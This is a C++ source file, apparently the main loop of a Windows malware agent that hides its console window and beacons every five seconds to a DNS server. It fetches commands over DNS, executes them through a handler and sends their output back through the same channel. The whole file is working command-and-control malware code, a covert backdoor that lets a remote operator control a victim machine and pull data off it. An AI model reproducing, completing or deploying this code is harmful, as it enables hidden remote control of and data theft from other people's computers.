#include "Declarations.h"
#include "DNSCommunication.h"
#include "Handler.h"
#include "Commands.h"

int main(){

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	LPSTR agentName = AgentName();
	std::string response;
	std::string tmp_command;
	DWORD numberOfCommands = 0;
	DWORD i = 0;
	while(TRUE){
		Sleep(5000);
		response = SendDNSPacket(agentName,PROBE,NULL);
		if (response.find("There were no commands") == std::string::npos){
			if (response.find("NR:")!= std::string::npos){
				// This gets the number of commands from the DNS server.
				response.erase(0,(int)response.find("\"") + 4);
				numberOfCommands = atoi(response.erase(response.length()-1,response.length()).c_str());
				for(i=0;i<numberOfCommands;i++){
					// The parsing sucks but maybe I will fix it in the future.
					tmp_command = SendDNSPacket(agentName,CMD,NULL);
					tmp_command.erase(0,(int)tmp_command.find("CMD:") + 4);
					tmp_command.erase((int)tmp_command.length()-2,(int)tmp_command.length());
					SendData(agentName,const_cast<char*>(HandleCommand(tmp_command.c_str())));
				}
			}
		}
	}
}